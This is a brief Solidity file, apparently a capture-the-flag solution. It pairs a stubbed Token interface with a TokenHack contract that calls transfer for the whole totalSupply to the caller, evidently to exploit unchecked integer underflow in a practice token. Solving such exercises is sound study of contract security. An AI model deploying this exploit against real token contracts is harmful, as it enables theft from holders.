// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "hardhat/console.sol";

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
  }

  function transfer(address _to, uint _value) public returns (bool) {
    
  }

  function balanceOf(address _owner) public view returns (uint balance) {

  }
}

contract TokenHack {
    address glb_addr;

    constructor(address token_addr) public {
        glb_addr = token_addr;
    }

    function takeDaTokens() public {

        Token tok_con = Token(glb_addr);

        tok_con.transfer(msg.sender, tok_con.totalSupply()) ? console.log("True") : console.log("False");

    }
}